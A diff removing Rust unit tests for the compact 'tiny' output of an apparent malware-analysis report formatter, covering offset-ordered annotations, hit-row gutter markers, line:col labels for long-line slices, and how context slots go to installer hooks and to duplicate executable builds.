-        conf: 0.9,
-        crit: Criticality::Notable,
-        mbc: None,
-        attack: None,
-        evidence: vec![],
-        match_count: 0,
-        source_file: None,
-        downgraded: false,
-    };
-
-    // One window at 0x1000, two matches in it — the second in a later row.
-    // Emission order must follow the bytes, not the (equal) criticalities.
-    let mut report = create_test_report(vec![finding("t/late"), finding("t/early")], vec![]);
-    // The ASCII-forward view is chosen by file type; the canonical labels
-    // are lowercase (`macho`, `elf`), which is what a real report carries.
-    report.files[0].file_type = "elf".to_string();
-    annotate(
-        &mut report.files[0],
-        vec![Win {
-            line: ContextLine {
-                loc: 0x1000,
-                line: None,
-                col: None,
-                data: vec![b'A'; 192],
-            },
-            notes: vec![note("t/late", 0x1050), note("t/early", 0x1005)],
-        }],
-    );
-
-    let out = format_tiny(&report);
-    let annotations: Vec<&str> = out.lines().filter(|l| l.starts_with("// ")).collect();
-    assert_eq!(
-        annotations,
-        vec![
-            "// N 1005 t/early desc (t/early)",
-            "// N 1050 t/late desc (t/late)",
-        ],
-        "annotations must carry their hex offset, in byte order: {out}",
-    );
-
-    // Every match offset must land in a row the gutter marks as a hit.
-    let rows: Vec<(u64, char)> = out
-        .lines()
-        .filter_map(|l| {
-            let (gutter, rest) = l.split_once(['-', ':'])?;
-            let marker = l.as_bytes()[gutter.len()] as char;
-            rest.starts_with(' ')
-                .then(|| u64::from_str_radix(gutter, 16).ok())
-                .flatten()
-                .map(|off| (off, marker))
-        })
-        .collect();
-    assert!(!rows.is_empty(), "no byte rows rendered: {out}");
-    for off in [0x1005u64, 0x1050] {
-        let covering = rows.iter().rfind(|(row, _)| *row <= off).copied();
-        assert!(covering.is_some(), "no row covers {off:x}: {out}");
-        if let Some((gutter, marker)) = covering {
-            assert_eq!(
-                marker, ':',
-                "row {gutter:x} holds the match at {off:x} but is not marked as a hit: {out}",
-            );
-        }
-    }
-    assert!(
-        rows.iter().any(|(_, marker)| *marker == '-'),
-        "a row with no match must be marked as context: {out}",
-    );
-}
-
-#[test]
-fn test_format_tiny_long_line_slice_shows_line_col() {
-    // A slice of an ultra-long single line renders as a pseudo-line labelled
-    // `line:col`. The chunk starts mid-line (byte 600, column 601), so the
-    // match at byte 606 is column 601 + 6 = 607 on line 1, and a leading `…`
-    // marks the clipped left side.
-    use crate::types::{ContextLine, Note};
-    let report = create_test_report(
-        vec![Finding {
-            precomputed_spans: None,
-            src: None,
-            kind: FindingKind::Capability,
-            trait_refs: vec![],
-            id: "obf/loop".to_string().into(),
-            desc: "obfuscated loop".to_string().into(),
-            conf: 0.9,
-            crit: Criticality::Suspicious,
-            mbc: None,
-            attack: None,
-            evidence: vec![],
-            match_count: 0,
-            source_file: None,
-            downgraded: false,
-        }],
-        vec![],
-    );
-    let mut report = report;
-    annotate(
-        &mut report.files[0],
-        vec![Win {
-            line: ContextLine {
-                loc: 600,
-                line: Some(1),
-                col: Some(601),
-                data: b"while(!![]){...}".to_vec(),
-            },
-            notes: vec![Note {
-                crit: Criticality::Suspicious,
-                id: "obf/loop".to_string().into(),
-                desc: "obfuscated loop".to_string().into(),
-                off: 606,
-                len: 4,
-                conf: 0.9,
-            }],
-        }],
-    );
-    let output = format_tiny(&report);
-    assert!(output.contains("// S 1:607 obfuscated loop"), "{output:?}");
-    assert!(
-        output.contains("..."),
-        "leading ellipsis marks the clip: {output:?}"
-    );
-}
-
-/// A file's leading comment window: offset 0, no notes.
-fn leading_comment(text: &str) -> Win {
-    Win {
-        line: crate::types::ContextLine {
-            loc: 0,
-            line: Some(1),
-            col: Some(1),
-            data: text.as_bytes().to_vec(),
-        },
-        notes: vec![],
-    }
-}
-
-/// A one-finding source file whose window shows `code`.
-fn hit_file(id: u32, path: &str, score: u32, code: &str) -> FileAnalysis {
-    let tid = format!("cat/trait::n{id}");
-    src_file(
-        id,
-        path,
-        score,
-        vec![finding_with(&tid, Criticality::Notable)],
-        vec![ctx_line(
-            9,
-            code,
-            Some(ctx_note(&tid, Criticality::Notable, 9)),
-        )],
-    )
-}
-
-#[test]
-fn tiny_draws_a_files_leading_comment_without_a_finding() {
-    // What the file says it is for reaches the grader beside the matched
-    // lines, even though no finding falls in it.
-    let mut file = hit_file(1, "/guard.js", 10, "SALT_KEY = 'pw_salt'");
-    file.context.insert(
-        0,
-        leading_comment("/** Password Guard: keeps only a salted hash locally. */\n").line,
-    );
-    let output = format_tiny(&report_with_files(vec![file]));
-    assert!(
-        output.contains("Password Guard: keeps only a salted hash locally"),
-        "{output}"
-    );
-    assert!(output.contains("SALT_KEY"), "{output}");
-}
-
-#[test]
-fn tiny_context_slots_put_installer_hooks_before_higher_scored_payload() {
-    // Five payload files outscore the hook script, which still takes a slot.
-    let mut files: Vec<FileAnalysis> = (1..=5)
-        .map(|i| {
-            hit_file(
-                i,
-                &format!("/pkg/Payload/lib{i}.py"),
-                100 - i,
-                &format!("CODELINE_{i} = 1"),
-            )
-        })
-        .collect();
-    files.push(hit_file(
-        6,
-        "/pkg.pkg!!Scripts!!postinstall",
-        3,
-        "HOOKLINE = launchctl()",
-    ));
-    let output = format_tiny(&report_with_files(files));
-    assert!(output.contains("HOOKLINE"), "{output}");
-    assert!(
-        !output.contains("CODELINE_5"),
-        "the lowest payload file yields its slot\n{output}"
-    );
-}
-
-#[test]
-fn tiny_context_slots_take_one_build_of_a_same_named_executable() {
-    let exe = |id: u32, path: &str, score: u32| {
-        let mut f = bin_file(id, score, vec![], vec![]);
-        f.path = path.to_string();
-        f.file_type = "macho".to_string();
-        f
-    };
-    let mut x64 = exe(1, "/seed/x64/zalocli", 100);
-    let mut arm = exe(2, "/seed/arm64/zalocli", 99);
-    for f in [&mut x64, &mut arm] {
-        let id = format!("cat/trait::b{}", f.id);
-        f.findings.push(finding_with(&id, Criticality::Notable));
-        annotate(
-            f,
-            vec![ctx_line(
-                1,
-                "ZALO",
-                Some(ctx_note(&id, Criticality::Notable, 1)),
-            )],
-        );
-    }
-    let output = format_tiny(&report_with_files(vec![x64, arm]));
-    assert_eq!(
-        output.matches("zalocli\t").count(),
-        1,
-        "one block for both builds\n{output}"
-    );
-    assert!(
-        output.contains("b1 desc") && !output.contains("b2 desc"),
-        "the higher-scored build\n{output}"
-    );
 }
